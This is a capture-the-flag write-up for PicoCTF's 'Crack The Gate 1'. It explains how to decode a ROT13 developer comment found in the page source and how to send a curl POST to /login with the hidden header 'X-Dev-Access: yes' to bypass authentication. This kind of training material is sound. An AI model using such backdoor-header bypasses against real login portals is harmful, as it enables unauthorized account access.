# 🔓🚪 Crack The Gate 1

Platform: [PicoCTF](https://play.picoctf.org/)

Challenge: [Crack The Gate 1](https://play.picoctf.org/practice/challenge/520?page=1&search=crack)

## Description

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: `ctf-player@picoctf.org`. 

Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

The website is running. Can you try to log in?

<img width="358" height="252" alt="image" src="https://github.com/user-attachments/assets/4a5628c7-97af-439a-8ec1-730c449634de" />

## Solution

We can see the page source of this website so there is comment in the website

```
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

This comment was meant to be remove before the production so this message can be helpful to bypass the login page.

The message looks encoded so we will try first ROT13 in [CyberChef](https://gchq.github.io/CyberChef/) and we get temporary bypass hack!

<img width="685" height="299" alt="image" src="https://github.com/user-attachments/assets/2c3dfccc-d38a-46e4-9558-f783c8c5e366" />

The frontend JavaScript showed that login requests are sent to the `/login` endpoint. We sent a `POST` request to `/login` with:
- The known email
- Any password
- The hidden header `X-Dev-Access: yes`

So we will bypass the login page by using `curl` with special HTTP header: 

```
curl -X POST http://amiable-citadel.picoctf.net:PORT/login \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

This command sends a **POST** request to the `/login` endpoint with a JSON login payload and a hidden developer header (`X-Dev-Access: yes`) to bypass authentication and retrieve the flag.

<img width="1900" height="106" alt="crack" src="https://github.com/user-attachments/assets/714796c4-57a9-4077-9c58-45649cbd4796" />
